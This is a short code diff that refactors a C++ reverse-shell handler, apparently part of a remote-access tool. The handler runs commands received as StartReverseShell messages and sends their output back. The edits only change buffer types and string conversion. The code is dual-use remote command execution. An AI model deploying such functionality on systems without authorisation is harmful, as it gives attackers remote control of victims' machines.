@@ -1,6 +1,7 @@
 #include "ReverseShellHandler.h"
 
 #include "SingleProcessManager.h"
+#include "StringExtensions.h"
 
 ReverseShellHandler::ReverseShellHandler(
 	IMessageSender* sender
@@ -14,15 +15,14 @@ ReverseShellHandler::ReverseShellHandler(
 {
 }
 
-void ReverseShellHandler::Handle(const MessageType type, std::span<char> content)
+void ReverseShellHandler::Handle(const MessageType type, SharedSpan content)
 {
-	const auto name = std::wstring(content.begin(), content.end());
-	const auto command = std::string(content.begin(), content.end());
+	const auto command = content.String();
 
 	switch (type)
 	{
 		case MessageType::StartReverseShell:
-			_manager->Run(name);
+			_manager->Run(ToWString(command));
 
 			break;
 
@@ -43,9 +43,7 @@ void ReverseShellHandler::Handle(const MessageType type, std::span<char> content
 
 void ReverseShellHandler::ReadOutput(const std::string& line) const
 {
-	const auto content = std::span(
-		const_cast<char*>(line.c_str()),
-		line.size());
+	const auto content = SharedSpan(line);
 
 	_sender->Send(MessageType::ReverseShellMessage, content);
 }
